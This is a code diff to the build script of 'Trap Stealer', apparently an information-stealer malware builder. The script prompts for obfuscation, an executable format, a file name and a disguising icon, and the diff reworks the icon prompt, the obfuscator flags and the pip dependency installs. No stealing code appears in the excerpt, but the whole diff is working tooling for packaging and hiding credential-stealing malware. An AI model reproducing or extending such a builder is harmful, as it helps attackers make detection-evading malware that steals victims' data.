@@ -95,19 +95,13 @@ while True:
     Exe = input('Do you want to make Trap Stealer with the exe format? (Take some time) Y/N: ')
     Exe = Exe.lower()
     name = input('Enter how you want the file to be named (Do not put the extension): ')
-    icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
-
-    if icon_path.strip():
-        icon_option = f'--icon={icon_path}'
-    else:
-        icon_option = ''
 
     while True:
         if Obfuscation in ['y', 'yes']:
             try:
                 with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                     file.write(new_content)
-                subprocess.run(['python', 'obfuscator.py', f'{name}', '--noupx'], check=False)
+                subprocess.run(['python', 'obfuscator.py', f'{name}'], check=False)
                 break
             except subprocess.CalledProcessError:
                 print('Obfuscation process encountered an error.')
@@ -128,18 +122,24 @@ while True:
 
     while True:
         if Exe in ['y', 'yes']:
+            icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
+
+            if icon_path.strip():
+                icon_option = f'--icon={icon_path}'
+            else:
+                icon_option = ''
             from sys import executable
 
             try:
                 __import__('Crypto')
             except ImportError:
-                subprocess.Popen(f'"{executable}" -m pip install \'Crypto\' --quiet', shell=True)
-                subprocess.Popen(f'"{executable}" -m pip install \'pycryptodome\' --quiet', shell=True)
+                subprocess.Popen(f'"{executable}" -m pip install Crypto --quiet', shell=True)
+                subprocess.Popen(f'"{executable}" -m pip install pycryptodome --quiet', shell=True)
 
             try:
                 __import__('pyinstaller')
             except ImportError:
-                subprocess.Popen(f'"{executable}" -m pip install \'pyinstaller\' --quiet', shell=True)
+                subprocess.Popen(f'"{executable}" -m pip install pyinstaller --quiet', shell=True)
 
             command = [
                 'python',
